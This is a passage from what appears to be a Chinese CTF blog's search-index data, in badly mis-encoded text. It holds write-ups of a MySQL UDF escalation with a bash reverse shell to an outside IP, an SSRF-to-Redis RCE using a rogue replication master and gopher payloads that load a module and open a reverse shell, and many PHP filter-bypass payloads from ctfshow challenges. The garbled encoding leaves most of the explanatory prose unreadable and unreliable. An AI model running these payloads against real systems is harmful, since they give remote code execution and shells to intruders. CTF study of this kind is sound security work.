sys_eval(&#x27;whoami&#x27;);&quot; #è¿”å› root\n\nåˆ›å»ºå‡½æ•°æˆåŠŸï¼Œè¿›è¡Œåå¼¹rootshell\n12mysql -uctf -p123456 -P 6666 -D mysql -e &quot;select sys_eval(&#x27;bash -c \\\\&#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/9999 0&gt;&amp;1\\\\&#x27;&#x27;);&quot;  #  \\\\&#x27; å¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰\n\næ¥å—shellï¼Œcat &#x2F;flag\n2020ç½‘é¼æ¯SSRFMeSSRFä¹‹Redisä¸»ä»å¤åˆ¶å®ç°RCErediså¸¸ç”¨å‘½ä»¤1234567891011121314151617set xz &quot;Hacker&quot;                     # è®¾ç½®é”®xzçš„å€¼ä¸ºå­—ç¬¦ä¸²Hackerget xz                              # è·å–é”®xzçš„å†…å®¹SET score 857                       # è®¾ç½®é”®scoreçš„å€¼ä¸º857INCR score                          # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1GET score                           # è·å–é”®scoreçš„å†…å®¹keys *                              # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®config set protected-mode no        # å…³é—­å®‰å…¨æ¨¡å¼get anotherkey                      # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼config set dir /root/redis          # è®¾ç½®ä¿å­˜ç›®å½•config set dbfilename redis.rdb     # è®¾ç½®ä¿å­˜æ–‡ä»¶åconfig get dir                      # æŸ¥çœ‹ä¿å­˜ç›®å½•config get dbfilename               # æŸ¥çœ‹ä¿å­˜æ–‡ä»¶åsave                                # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œflushall                            # åˆ é™¤æ‰€æœ‰æ•°æ®del key                             # åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®slaveof ip port                     # è®¾ç½®ä¸»ä»å…³ç³»redis-cli -h ip -p 6379 -a passwd   # å¤–éƒ¨è¿æ¥\n\nä¸»ä»å¤åˆ¶æ˜¯æŒ‡å°†ä¸€å°Redisä¸»æœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„Redisä»æœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›\næ‰€æœ‰çš„æ•°æ®ä¿®æ”¹åªåœ¨ä¸»æœåŠ¡å™¨ä¸Šè¿›è¡Œï¼Œç„¶åå°†æœ€æ–°çš„æ•°æ®åŒæ­¥ç»™ä»æœåŠ¡å™¨ï¼Œè¿™æ ·å°±ä½¿å¾—ä¸»ä»æœåŠ¡å™¨çš„æ•°æ®æ˜¯ä¸€è‡´çš„\nå»ºç«‹ä¸»ä»å¤åˆ¶ï¼Œæœ‰3ç§æ–¹å¼ï¼š\né…ç½®æ–‡ä»¶å†™å…¥ slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\nredis-serverå¯åŠ¨å‘½ä»¤ååŠ å…¥ --slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\nè¿æ¥åˆ°å®¢æˆ·ç«¯ä¹‹åæ‰§è¡Œ slaveof &lt;master_ip&gt; &lt;master_port&gt;\n\n\n  PSï¼šå»ºç«‹ä¸»ä»å…³ç³»åªéœ€è¦åœ¨ä»èŠ‚ç‚¹æ“ä½œå°±è¡Œäº†ï¼Œä¸»èŠ‚ç‚¹ä¸ç”¨ä»»ä½•æ“ä½œ\nä½¿ç”¨expè¿›è¡Œrceé¢„å…ˆé€šè¿‡å†…ç½‘ç©¿é€å°†ç«¯å£ï¼ˆ8009ï¼‰æ˜ å°„åˆ°å…¬ç½‘ä¸Š\nä½¿ç”¨ Redis è¿œç¨‹ä»£ç æ‰§è¡Œè„šæœ¬å¼€å¯æœåŠ¡\nä½¿ç”¨è¯´æ˜\nhttps://blog.csdn.net/gitblog_09313/article/details/142229727\n1python3 redis_rogue_server.py -v -path exp.so -lport 8009\n\n\n\nè¿›å…¥åˆ°ç›®æ ‡ç›®å½•12345gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit_auth rootconfig set dir /tmp/ #tmpç›®å½•æœ‰ç›¸åº”æƒé™quit\n\nä»æœ¬åœ°æ·»åŠ æ–‡ä»¶123456gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%2520%2520%250Aquit_auth rootconfig set dbfilename exp.soslaveof 121.43.126.238 8009  #å…¬ç½‘ipï¼Œ å¼€å¯ä¸»æœåŠ¡quit\n\nåŠ è½½exp12345gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520.%252Fexp.so%250Aquit_auth rootmodule load ./exp.soquit\n\nrce12345gopher://0.0.0.0:6379/_auth%2520root%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit_auth rootsystem.exec &quot;cat /flag&quot;quit\n\nä»¥ä¸Šä¸‰ä¸ªå‘½ä»¤å¯ä»¥åˆå¹¶123456789gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%250Amodule%2520load%2520.%252Fexp.so%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit_auth rootconfig set dir /tmp/config set dbfilename exp.soslaveof 121.43.126.238 8009module load ./exp.sosystem.exec &quot;cat /flag&quot;quit\n\nä¹Ÿå¯ä»¥è¿›è¡Œåå¼¹shell123456gopher://0.0.0.0:6379/_auth%2520root%250Asystem.rev%2520121.43.126.238%2520%25208888%250Aquit#ä¸Šè¿°payloadçš„è§£ç ç»“æœ_auth rootsystem.rev 121.43.126.238  8888quit\n\n2023è“æ¡¥æ¯WP1.çˆ¬è™«åè®®urlè¾“å…¥robots.txt\n\nå°†æœ€ä¸‹è¾¹ä¸€è¡Œå†è¾“å…¥url\n\nè®¿é—®æ–‡ä»¶å³å¯\n2.packet\nè¿½è¸ªTCPæµ ç¬¬åä¹ä¸ª base64è§£å¯†å³å¯\n\n3.ccé€šè¿‡é™„ä»¶å¯çŸ¥æ˜¯aesåŠ å¯†\né€šè¿‡å·¥å…·è§£å¯†å³å¯\n\n","slug":"èµ›äº‹æ€»ç»“","date":"2024-10-28T12:10:30.000Z","categories_index":"èµ›äº‹æ€»ç»“","tags_index":"èµ›äº‹æ€»ç»“","author_index":"Sygsdsg"},{"id":"cd1787040df7226f24b8f728e6089b8f","title":"phpç‰¹æ€§","content":"phpç‰¹æ€§1.intval \nä¹Ÿå°±æ˜¯è¯´ä¼ å…¥æ˜¯æ•°ç»„æ—¶ï¼Œè¿”å›å€¼ä¸º1 (å¼±æ¯”è¾ƒ)\næ­¤å‡½æ•°ä¼šå°† + ç©ºæ ¼æ¥è¿›è¡Œè·³è¿‡åˆ¤æ–­\n\n\nå½“base&#x3D;0æ—¶ï¼Œè¿›åˆ¶å¯ä»¥è‡ªå®šä¹‰\nWeb92ä¼ å…¥å…¶ä»–è¿›åˆ¶å½¢å¼çš„4476å³å¯\nWeb93Eg:å…«è¿›åˆ¶010574  16è¿›åˆ¶ 0x117c\nå› ä¸ºè¿”å›å€¼æ˜¯æ•´æ•° (ä¹Ÿå°±æ˜¯åªæ£€æŸ¥æ•´æ•°)\næ‰€ä»¥ä¼ å…¥å€¼ä¸º4476.1ä¹Ÿè¡Œ\n2.preg_matchâ€‹    mâ€”è¡¨ç¤ºå¤šè¡ŒåŒ¹é…ï¼Œé»˜è®¤åªåŒ¹é…ä¸€è¡Œï¼ˆç¬¬ä¸€è¡Œï¼‰\nweb91åˆ©ç”¨è¯¥ç‰¹æ€§ç»•è¿‡ç¬¬ä¸€è¡Œçš„æ­£åˆ™åŒ¹é…\nâ€‹    payload:%a0php\n web131\nåˆ©ç”¨æ ˆæº¢å‡º ï¼ˆé•¿åº¦ç»•è¿‡ï¼‰\n\nè¯·æ±‚å³å¯\n3.strops\nâ€‹    æ£€æµ‹æŒ‡å®šå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå‡ºç°å³é˜»æ–­ï¼Œè¿”å›false\n \n\n4.phpä¸‰ç›®è¿ç®—ç¬¦Web98 è‡ªè¡Œç†è§£\n5.in_arrayâ€‹    æœç´¢æ•°ç»„ä¸­æ˜¯å¦æœ‰æŒ‡å®šå€¼\nâ€‹    in_array(a,b) åœ¨bä¸­å¯»æ‰¾æ˜¯å¦æœ‰a\n6.is_numericâ€‹    ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²\n$var1 &#x3D; 123;\n$var2 &#x3D; â€œ456â€;\n$var3 &#x3D; â€œabcâ€;\nvar_dump(is_numeric($var1)); &#x2F;&#x2F; è¾“å‡º: bool(true)\nvar_dump(is_numeric($var2)); &#x2F;&#x2F; è¾“å‡º: bool(true)\nvar_dump(is_numeric($var3)); &#x2F;&#x2F; è¾“å‡º: bool(false)\n7. andä¸&amp;&amp;çš„åŒºåˆ« ï¼ˆä¼˜å…ˆçº§ï¼‰+åå°„ç±»ReflectionClassçš„ä½¿ç”¨Web100â€‹    &amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or\nâ€‹    é€»è¾‘è¿ç®—ç¬¦ **and** ä¼˜å…ˆçº§æ¯” **=** æ›´ä½\nâ€‹    $v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nâ€‹    æ‰€ä»¥åªè¦v1æ˜¯æ•°å­— is_numeric()è¿”å›å€¼ä¸º1  v0å°±ä¸º1\nâ€‹    V2ç›´æ¥é—­åˆå³å¯\n&lt;?php\n$a&#x3D;true and false and false;\nvar_dump($a); è¿”å›true\n$a&#x3D;true &amp;&amp; false &amp;&amp; false;\nvar_dump($a); è¿”å›false\nâ€‹    eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);\nl v2ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œv3è¦ä¸ºåˆ†å·ä¸(â€˜ctfshowâ€™)ç»“åˆèµ·æ¥&#96;è¿›è¡Œé—­åˆ\nl v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;; \nReflectionClasså®ƒå¯ä»¥ä¸å·²å®šä¹‰çš„ç±»å»ºç«‹æ˜ å°„å…³ç³»ï¼Œé€šè¿‡åå°„ç±»å¯ä»¥å¯¹ç±»æ“ä½œ\nweb132&amp;&amp;çš„ä¼˜å…ˆçº§é«˜äº||æ‰€ä»¥åœ¨\nif($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)\nä¸­ï¼Œå…ˆè¿è¡Œ&amp;&amp;å†ä¼šè¿è¡Œ||ï¼Œ\nå½“å¯¹äºâ€œä¸â€ï¼ˆ&amp;&amp;ï¼‰ è¿ç®—ï¼š x &amp;&amp; y å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼› \nå¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š x||y å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œy\neg:\n&lt;?php   \n  $test=&quot;æå››&quot;;   \n  $test==&quot;å¼ ä¸‰&quot;&amp;&amp;$test=&quot;å¼ ä¸‰æ¥äº†&quot;;   \n  echo $test; //è¾“å‡ºâ€œæå››â€   \n  $test=&quot;æå››&quot;;   \n  $test==&quot;å¼ ä¸‰&quot;||$test=&quot;å¼ ä¸‰ä¸åœ¨è¿™é‡Œ&quot;;   \n  echo $test; //è¾“å‡ºâ€œå¼ ä¸‰ä¸åœ¨è¿™é‡Œâ€   \n?&gt;\nç¬¬ä¸€éƒ¨åˆ†  $code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag  $code&#x3D;admin è¿”å›ï¼ˆfalseï¼‰å³å¯\nç¬¬äºŒéƒ¨åˆ†  $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;â€adminâ€             $password&#x3D;1  è¿”å›ï¼ˆfalseï¼‰å³å¯\næœ€ç»ˆpayload:\nGET: ?code&#x3D;admin&amp;password&#x3D;1&amp;username&#x3D;admin\nhex2binè½¬æ¢8.web102\n115044383959474e6864434171594473 è¯¥å­—ç¬¦ä¸²16è¿›åˆ¶è½¬å­—ç¬¦ä¸² åˆ©ç”¨hex2binè½¬æ¢ä¹‹åä¸º base64è§£å¯†ä¹‹åæ˜¯ &lt;?&#x3D;cat  *;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource\nå›æ˜¾çš„æ˜¯å‘½ä»¤æ‰§è¡Œåçš„ç»“æœ\nphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;resource\nå›æ˜¾çš„æ˜¯æ–‡ä»¶å†…å®¹base64ç¼–ç åçš„æ ¼å¼\n9.ctype_alpha(mixed $text): bool string ç±»å‹çš„ text é‡Œé¢çš„æ‰€æœ‰å­—ç¬¦æ˜¯å¦éƒ½æ˜¯å­—æ¯[A-Za-z]ã€‚\nå¦‚æœåœ¨å½“å‰åŒºåŸŸè®¾ç½®ä¸­ text é‡Œçš„æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯å­—æ¯ï¼Œé‚£ä¹ˆå°±è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚å½“ä½¿ç”¨ç©ºå­—ç¬¦ä¸²è°ƒç”¨æ—¶ï¼Œç»“æœå§‹ç»ˆä¸º falseã€‚\n10.å˜é‡è¦†ç›–web105$$key=$$value \nå¦‚æœ$keyæ˜¯â€nameâ€ï¼Œé‚£ä¹ˆ**$$keyå°±ç­‰äº$name**\ndie($suces)\nè¾“å‡º $suces å˜é‡çš„å€¼ï¼Œç„¶åç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚\npostä¸­valueä¸èƒ½ç­‰äºflag\ngetä¸­keyä¸èƒ½ç­‰äºerror\næ€è·¯ä¸€\né€šè¿‡die($error);\nGET:suces&#x3D;flag\nPOST:error&#x3D;suces\næˆ–è€…å¼•å…¥ç¬¬ä¸‰ä¸ªå˜é‡\nGET:x&#x3D;flag\nPOST:error&#x3D;x\næ€è·¯äºŒ\né€šè¿‡die($suces)\n?suces&#x3D;flag&amp;flag&#x3D;1\n11.parse_strå°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡\nè®¾ç½®äº†ç¬¬äºŒä¸ªå˜é‡ result, å˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„\n123$str = &quot;first=value&quot;;parse_str($str, $output);echo $output[&#x27;first&#x27;];\n\nweb107123456$v1 = $_POST[&#x27;v1&#x27;];$v3 = $_GET[&#x27;v3&#x27;];parse_str($v1,$v2);if($v2[&#x27;flag&#x27;]==md5($v3))&#123;    echo $flag;&#125; \n\næ­¤æ—¶v2æ˜¯v1æ•°ç»„ä¸­çš„å…ƒç´ ï¼ŒåŒæ—¶v2ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„\n$v2[â€˜flagâ€™]å°±æ˜¯v2æ•°ç»„ä¸­é”®å€¼ä¸ºflagçš„å…ƒç´ \næ€è·¯ä¸€\nä¼ å…¥ç‰¹æ®Šå€¼è¿›è¡Œç»•è¿‡\nGET:v3&#x3D;240610708    md5åŠ å¯†ä¹‹åä¸º0eå­—ç¬¦ä¸² è¿”å›0\nPOST:v1&#x3D;flag&#x3D;0\næ€è·¯äºŒ\nè®©v1å€¼ä¸ºv3md5åŠ å¯†å€¼å³å¯\nGET:v3&#x3D;aa\nPOST:v1&#x3D;flag&#x3D;4124bc0a9335c27f086f24ba207a4912\n12.strrev+ereg strrevåè½¬å­—ç¬¦ä¸²\n1&lt;?phpecho strrev(&quot;Hello world!&quot;); // è¾“å‡º &quot;!dlrow olleH&quot;?&gt;\n\n1ereg (&quot;^[a-zA-Z]+$&quot;);\n\næ­£åˆ™è¡¨è¾¾å¼ä¸­^æ˜¯å¼€å§‹ä½ç½®ï¼Œ$æ˜¯ç»“æŸä½ç½®ï¼Œ+è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡\neregå‡½æ•°å­˜åœ¨%00æˆªæ–­æ¼æ´\næ€è·¯\nä¼ å…¥å­—æ¯ä¹‹åç”¨%00æˆªæ–­\nå†ä¼ å…¥å€’å™æ•°å­—\npayload:?c&#x3D;a%00778\n13.PHPå¼‚å¸¸å¤„ç† Exceptionç»è¿‡å®éªŒå‘ç°å¦‚æœç±»ä¸­å­˜åœ¨**__toString**çš„é­”æœ¯æ–¹æ³•\nåˆ™ç»™ä»€ä¹ˆå€¼å°±è¿”å›ä»€ä¹ˆå€¼\neg \n\n\næ‰€ä»¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nç»æŸ¥è¯¢ä¹‹åå‘ç°Exceptionç±»å¯ä»¥å®ç°ï¼ˆphpå†…ç½®ç±»ï¼‰\n![å±å¹•æˆªå›¾ 2024-04-21 145659](php&#x2F;å±å¹•æˆªå›¾ 2024-04-21 145659-17298377263546.png)\n12345678&lt;?php    try &#123;            throw new Exception(&quot;Some error message&quot;);    &#125; catch(Exception $e) &#123;        echo $e;&#125;?&gt;\n\n\n\n1234&lt;?php$reflectionClass = new ReflectionClass(&#x27;Exception&#x27;);echo $reflectionClass-&gt;__toString();?&gt;\n\n\n\nweb109payload:\nv1&#x3D;exception&amp;v2&#x3D;system(ls)\nä¸Šè¾¹æåˆ°çš„åå°„æ€§ä¹Ÿå¯ä»¥ ç”¨æ³•å®Œå…¨ç›¸åŒ\nv1&#x3D;Reflectionclass&amp;v2&#x3D;system(ls)\nPHPåŸç”Ÿç±»æ€»ç»“https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\n14.FilesystemIteratorï¼ˆphpå†…ç½®ç±»ï¼‰éå†æ–‡ä»¶\n\n12345678&lt;?php$info = new SplFileInfo(&#x27;foo&#x27;);var_dump($info-&gt;__toString());echo $info.PHP_EOL;$info = new SplFileInfo(&#x27;/usr/bin/php&#x27;);var_dump($info-&gt;__toString());echo $info.PHP_EOL;?&gt;\n\n12345ä»¥ä¸Šç¤ºä¾‹çš„è¾“å‡ºç±»ä¼¼äºï¼šstring(3) &quot;foo&quot;foostring(12) &quot;/usr/bin/php&quot;/usr/bin/php\n\nå¯ä»¥ç»“åˆObjæ¥è¯»å–å½“å‰ç›®å½•\n\nè¿”å›ç¬¬ä¸€ä¸ªæ–‡ä»¶å\n\n12345&lt;?php$dir = new DirectoryIterator(dirname(__FILE__));foreach ($dir as $fileinfo) &#123;echo $fileinfo;&#125;?&gt;\n\néå†ç›®å½•\nweb110payload:v1&#x3D;filesystemIterator&amp;v2&#x3D;getcwd\n15.GLOBALå…¨å±€å˜é‡\nweb111\n16.is_file\n\nå¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”ä¸ºæ­£å¸¸çš„æ–‡ä»¶åˆ™è¿”å› **true**ï¼Œå¦åˆ™è¿”å› **false**ã€‚  \n\nå¯è§æ”¯æŒä¼ªåè®®çš„çš„å°è£…\næ­£å¸¸ç›´æ¥ä¼ å…¥ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ä¼šè¿”å›true\nç”¨ä¼ªåè®®å°è£…ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ä¼šè¿”å›false \n\n\n17.compress.zlib:&#x2F;&#x2F;web113æ€è·¯ä¸€\nå‘ç°è¿‡æ»¤filter\næ¢å–å…¶ä»–æ²¡æœ‰è¿‡æ»¤çš„æµå³å¯\ncompress.zlib:&#x2F;&#x2F;\næ€è·¯äºŒ\nè¿›è¡Œç›®å½•æº¢å‡º ï¼ˆé•¿åº¦ç»•è¿‡ï¼‰\n&#x2F;proc&#x2F;self&#x2F;rootä»£è¡¨æ ¹ç›®å½•\nè¶…è¿‡is_fileèƒ½å¤„ç†çš„æœ€å¤§é•¿åº¦å°±ä¸è®¤ä¸ºæ˜¯ä¸ªæ–‡ä»¶\npayload:\nfile&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F; self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php\n18.num!&#x3D;&#x3D;36 and num&#x3D;&#x3D;36 å’Œ trimç»•è¿‡web115å…ˆæ¥çœ‹å®˜æ–¹æ–‡æ¡£ä¸­å¯¹äºè¿™ä¸¤ä¸ªæ¯”è¾ƒè¿ç®—ç¬¦çš„è§£é‡Š\n\n\n\n$a &#x3D;&#x3D; $b\nç­‰äº\n**true**ï¼Œå¦‚æœç±»å‹è½¬æ¢å $a ç­‰äº $bã€‚\n\n\n\n$a !&#x3D;&#x3D; $b\nä¸å…¨ç­‰\n**true**ï¼Œå¦‚æœ $a ä¸ç­‰äº $bï¼Œæˆ–è€…å®ƒä»¬çš„ç±»å‹ä¸åŒã€‚\n\n\nå½“ä¸¤ä¸ªæ“ä½œå¯¹è±¡éƒ½æ˜¯  æ•°å­—å­—ç¬¦ä¸²ï¼Œ  æˆ–ä¸€ä¸ªæ˜¯æ•°å­—å¦ä¸€ä¸ªæ˜¯  æ•°å­—å­—ç¬¦ä¸²ï¼Œ  å°±ä¼šè‡ªåŠ¨æŒ‰ç…§æ•°å€¼è¿›è¡Œæ¯”è¾ƒã€‚  æ­¤è§„åˆ™ä¹Ÿé€‚ç”¨äº  switch è¯­å¥ã€‚  å½“æ¯”è¾ƒæ—¶ç”¨çš„æ˜¯ === æˆ– !==ï¼Œ  åˆ™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢â€”â€”å› ä¸ºä¸ä»…è¦å¯¹æ¯”æ•°å€¼ï¼Œè¿˜è¦å¯¹æ¯”ç±»å‹ã€‚ \nvar_dump(intval($num));\n$num&#x3D;%0c36æ—¶å¼ºåˆ¶è½¬æ¢åå€¼ä¸º36\nä¸ºä»€ä¹ˆè¦ä¼ **%0c**\n%0cåœ¨asciiè¡¨ä¸­ä»£è¡¨æ¢é¡µç¬¦\n\n\nå¹¶ä¸”trimä¸­å»é™¤çš„å­—ç¬¦ä¸åŒ…å«%0c å¯ä»¥ç»•è¿‡\né€šè¿‡æ–‡æ¡£å·²çŸ¥**&#x3D;&#x3D;åœ¨åšæ¯”è¾ƒæ—¶ä¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œè½¬æ¢æˆæ•°å€¼åå†è¿›è¡Œæ¯”è¾ƒ** è¿™é‡Œçš„è½¬æ¢è¿‡ç¨‹ç±»ä¼¼ intval()\n%0c36åœ¨è¿™ä¸ªè½¬æ¢è¿‡ç¨‹ä¸­ä¹Ÿä¼šè½¬æ¢æˆæ•°å€¼36\næ‰€ä»¥\nnum&#x3D;%0c36 num&#x3D;&#x3D;36 ä¸ºçœŸ\n!&#x3D;&#x3D;å±äºå¼ºæ¯”è¾ƒç±»å‹\nä¼šæ¯”è¾ƒæ•°å€¼çš„åŒæ—¶æ¯”è¾ƒç±»å‹\n%0c36æ˜æ˜¾æ˜¯ä¸ªå­—ç¬¦ä¸²ç±»å‹  36æ˜¯æ•´å½¢\næ‰€ä»¥\nnum&#x3D;%0c36 numï¼&#x3D;&#x3D;36 ä¸ºçœŸ\nä¸¤ä¸ªåˆ¤æ–­åŒæ—¶ç»•è¿‡\n19.php getæˆ–postå˜é‡åä¸­éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™getæˆ–è€…postä¼ å…¥çš„å˜é‡åå«æœ‰  ç©ºæ ¼ã€+ã€.ã€[  åˆ™ä¼šè¢«è½¬åŒ–ä¸º\neg:\ndiao_s.i &#x3D;&#x3D;ã€‹diao_s_i\nä¹Ÿå°±æ˜¯PHPç½‘é¡µç”¨diao_s_iå¯ä»¥æ­£å¸¸æ¥æ”¶diao_s.iä¼ é€’è¿‡æ¥çš„å€¼ï¼Œä¸­é—´ä¼šæœ‰ä¸ªè‡ªåŠ¨è½¬æ¢çš„è¿‡ç¨‹\nå¦‚æœä¼ å…¥**[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹å**ï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢ã€‚\neg:\ndiao[s.i &#x3D;&#x3D;&gt; diao_s.iï¼Œåˆ©ä¸Šé¢çš„[ç»è¿‡ä¸€æ¬¡è½¬æ¢åå¯ä»¥æ­£å¸¸æ¥æ”¶\nweb123\nå¦‚æœè®©ifåˆ¤æ–­ä¸ºçœŸï¼Œå°±å¿…é¡»ä¼ å…¥CTF_SHOW.COM\næˆ‘ä»¬å·²çŸ¥  .  æ˜¯éæ³•å˜é‡åï¼Œä½†è¦ä¿ç•™  .   å°±éœ€è¦æŠŠ  _  æ¢æˆ  [  å³å¯\næ€è·¯ä¸€\npayload:\nCTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;echo $flag\næ€è·¯äºŒ\nåˆ©ç”¨phpå†…ç½®å‡½æ•°\n\n\n12345&lt;?php$array = [&#x27;lastname&#x27;, &#x27;email&#x27;, &#x27;phone&#x27;];var_dump(implode(&quot;,&quot;, $array));// string(20) &quot;lastname,email,phone&quot;\n\n\n\n\n\næ‹¿æ–‡ä»¶å\n\næ‹¿å·²å®šä¹‰å˜é‡å€¼\n\nå¯ä»¥å¤šå»äº†è§£getå¼€å¤´çš„phpå†…ç½®å‡½æ•°\n20.var_exportå’Œinclude$_GET[1]å’Œhighlight_file($GET[1])web125$_GET[1]çš„ç”¨æ³•\n$_GET[1]ï¼šè¿™ä¼šä» URL æŸ¥è¯¢å‚æ•°ä¸­è·å–åä¸º 1 çš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²æ˜¯æœ‰æ•ˆçš„æ–‡ä»¶è·¯å¾„ï¼Œç„¶ååœ¨æŸç§ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œï¼Œæ¯”å¦‚é€šè¿‡ include æˆ– file_get_contents ç­‰å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¼šå°†è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚\nPS:file_get_contentsæ— æ³•ä½¿ç”¨åŸå› \n\n21.parse_str()åŠ$_SERVER[argv]çš„åˆ©ç”¨web126\n12345678&lt;?php$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;// æ¨èç”¨æ³•parse_str($str, $output);echo $output[&#x27;first&#x27;];  // valueecho $output[&#x27;arr&#x27;][0]; // foo barecho $output[&#x27;arr&#x27;][1]; // baz\n\nâ€˜argvâ€˜\nâ€‹              ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query string\nå‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼š$_SERVER[&#39;argv&#39;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä»–çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°ã€‚ ç½‘é¡µæ¨¡å¼ä¸‹ï¼šéœ€è¦php.iniå¼€å¯register_argc_argvé…ç½®\n\n$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;];$_SERVER[â€˜argvâ€™][0] æ˜¯$_SERVER[â€˜QUERY_STRINGâ€™];ï¼Œ$_SERVER[â€˜argvâ€™][1] çš„ä¼ é€’æ–¹å¼å°±å’Œå‘½ä»¤è¡Œç±»ä¼¼äº†ï¼Œç©ºæ ¼ï¼Œç„¶åä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚åˆ©ç”¨$_SERVER[â€˜argvâ€™][1] 